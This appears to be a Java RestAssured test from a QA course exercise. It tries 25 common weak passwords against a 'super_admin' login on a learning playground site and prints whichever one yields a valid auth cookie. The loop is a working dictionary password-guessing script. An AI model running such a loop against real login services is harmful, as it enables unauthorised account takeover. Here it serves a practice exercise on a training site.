import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.*;


public class Password {
    @Test
    public void testGetPass() {


        Map<String, String> notSecurityPass = new HashMap<>();
        notSecurityPass.put("password1", "123456");
        notSecurityPass.put("password2", "123456789");
        notSecurityPass.put("password3", "qwerty");
        notSecurityPass.put("password4", "12345678");
        notSecurityPass.put("password5", "111111");
        notSecurityPass.put("password6", "iloveyou");
        notSecurityPass.put("password7", "1234567");
        notSecurityPass.put("password8", "password");
        notSecurityPass.put("password9", "12345");
        notSecurityPass.put("password10", "abc123");
        notSecurityPass.put("password11", "qwertyuiop");
        notSecurityPass.put("password12", "qwerty123");
        notSecurityPass.put("password13", "555555");
        notSecurityPass.put("password14", "admin");
        notSecurityPass.put("password15", "18atcskd2w");
        notSecurityPass.put("password16", "7777777");
        notSecurityPass.put("password17", "1q2w3e4r");
        notSecurityPass.put("password18", "654321");
        notSecurityPass.put("password19", "888888");
        notSecurityPass.put("password20", "lovely");
        notSecurityPass.put("password21", "qwertyuiop");
        notSecurityPass.put("password22", "welcome");
        notSecurityPass.put("password23", "123qwe");
        notSecurityPass.put("password24", "password1");
        notSecurityPass.put("password25", "dragon");


        for (String pass : notSecurityPass.values()) {

            Response responseForGet = RestAssured
                    .given()
                    .queryParams("login", "super_admin")
                    .queryParams("password", pass)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework");

            String responseCookie = responseForGet.getCookie("auth_cookie");

            Map<String, Object> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);

            Response responseForCheck = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            Boolean result = responseForCheck.asPrettyString().contains("You are NOT authorized");
            if (result == false) {
                System.out.println("Верный пароль: " + pass);
                responseForCheck.prettyPrint();
            }


        }

    }
}

